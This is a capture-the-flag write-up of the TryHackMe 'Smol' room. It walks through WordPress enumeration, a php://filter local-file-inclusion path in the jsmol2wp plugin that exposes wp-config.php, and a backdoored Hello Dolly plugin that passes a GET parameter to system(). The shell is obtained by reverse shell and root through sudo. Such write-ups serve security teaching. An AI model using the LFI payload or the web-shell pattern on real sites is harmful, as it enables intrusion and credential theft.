# Smol â€” TryHackMe (Easyâ€“Medium) ğŸ§©ğŸ§ ğŸ§ª

Smol looks harmless.
It isnâ€™t.

This box is a perfect example of how **WordPress + bad plugins + lazy code**
can quietly turn into **full system compromise**.

No kernel exploits.
Just chaining mistakes the way attackers do in the real world.

---

## Machine Overview ğŸ–¥ï¸ğŸ“Œ

Room Name: Smol  
Target IP: 10.201.36.95  
Operating System: Ubuntu Linux  
Difficulty: Easyâ€“Medium  

Primary focus:
- WordPress enumeration
- Vulnerable plugin exploitation
- **LFI â†’ RCE chaining**
- Credential reuse & user pivoting
- Privilege escalation via sudo misconfigurations

Very bug-bountyâ€“style box.

---

## Initial Recon ğŸ”

Basic service discovery showed a minimal surface.

nmap -sC -sV 10.201.36.95

Open ports:
- 22/tcp  SSH ğŸ”
- 80/tcp  HTTP (WordPress) ğŸŒ

The site redirected to:

ğŸ‘‰ **http://www.smol.thm**

Confirming a WordPress installation.

---

## WordPress Enumeration ğŸŒğŸ§

Given the room theme, plugin enumeration was the obvious next step.

wpscan --url http://www.smol.thm -e vp

A vulnerable plugin immediately stood out:

â— **jsmol2wp**

Known issue:
- **Local File Inclusion (LFI)**

And yes â€” it was exploitable.

---

## LFI â†’ Credential Disclosure ğŸ“‚ğŸ”“

The vulnerable endpoint:

/wp-content/plugins/jsmol2wp/php/jsmol.php

By abusing PHP filters:

php://filter/resource=../../wp-config.php

Result:
- WordPress database credentials exposed
- wp-config.php fully readable

Using these credentials:
- WordPress admin panel access achieved

At this point, the CMS was owned.

---

## Code Review â€” Backdoored Plugin ğŸš¨

Inside the admin panel, a subtle hint appeared:

> Check the source code of the â€œHello Dollyâ€ plugin

Reviewing the plugin source revealed something *very* wrong:

```php
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
Thatâ€™s not a vulnerability.

Thatâ€™s a deliberate backdoor.

Remote Code Execution ğŸ’¥
By chaining:

LFI (jsmol2wp)

Backdoored plugin (Hello Dolly)

Direct command execution was possible:

?cmd=id

A reverse shell was then spawned.

Result:

Initial foothold obtained

Shell access confirmed

Clean. Silent. Effective.

Local Enumeration & Credential Pivoting ğŸ”
Database Enumeration
Using the leaked database credentials:

Connected to MySQL

Dumped password hashes

Cracked a user password

User Access
Logged in as:

diego

User flag retrieved successfully.

Lateral Movement ğŸ”„
Further enumeration revealed:

SSH key belonging to user think

Group and permission misconfigurations

After switching users:

Backup files became accessible

Credentials for another user were recovered

New user:

xavi

At this stage, the box was basically unraveling itself.

Privilege Escalation ğŸš€
Checking sudo permissions:

sudo -l

Revealed:
(xavi) ALL=(ALL) ALL

Thatâ€™s game over.

Switching to root:

sudo su

Result:

Root access obtained

Full system compromise

Flags ğŸ
User Flag: Retrieved âœ…

Root Flag: Retrieved âœ…

Smol completed.

Key Takeaways ğŸ§ ğŸ“Œ
Never trust third-party WordPress plugins

LFI is rarely â€œjust LFIâ€ â€” itâ€™s usually a pivot

Always review source code, even â€œharmlessâ€ plugins

Database credentials almost always enable user pivots

Enumeration + chaining beats rushing exploits

ğŸ“¬ Contact & Projects ğŸ‘¨â€ğŸ’»ğŸ“
Daksh Baweja
ğŸ“§ Email: dakshbaweja20@gmail.com
ğŸ™ GitHub: https://github.com/sudo0xksh
ğŸ”— LinkedIn: https://www.linkedin.com/in/dakshbaweja

ğŸš€ Deteroid ğŸ”¥
Deteroid is a community-driven platform for bug bounty hunters
to share insights, rate programs, and collaborate on real-world findings.

Built to help hackers hunt smarter, not louder.

ğŸ“¸ Instagram: https://www.instagram.com/deteroids/

Final Words â˜•
Smol teaches a brutal lesson:

â€œYou donâ€™t need exploits
when the code is already betraying you.â€
